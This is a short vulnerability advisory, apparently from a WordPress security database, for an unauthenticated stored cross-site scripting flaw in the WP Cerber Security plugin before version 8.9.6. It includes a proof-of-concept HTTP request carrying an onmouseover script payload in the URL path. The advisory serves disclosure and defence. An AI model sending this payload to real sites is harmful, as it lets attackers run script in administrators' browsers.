# WP Cerber Security, Anti-spam & Malware Scan < 8.9.6 - Unauthenticated Stored Cross-Site Scripting
Description

The plugin does not sanitise the $url variable before using it in an attribute in the Activity tab in the plugins dashboard, leading to an unauthenticated stored Cross-Site Scripting vulnerability.

# Proof of Concept
```
POST /"/onmouseover=alert(1);// HTTP/1.1

Host: 127.0.0.1

Content-Type: application/x-www-form-urlencoded

Content-Length: 100



a[b][c][d][e][f][g][h][i][j][k][l][m][n][o][p][q][r][s][t][u][v][w][x][y][z][1][2][3][4][5][6]=12345



Then the admin needs to browse to http://127.0.0.1:8001/wp-admin/admin.php?page=cerber-security&tab=activity and move mouse over the link.
```
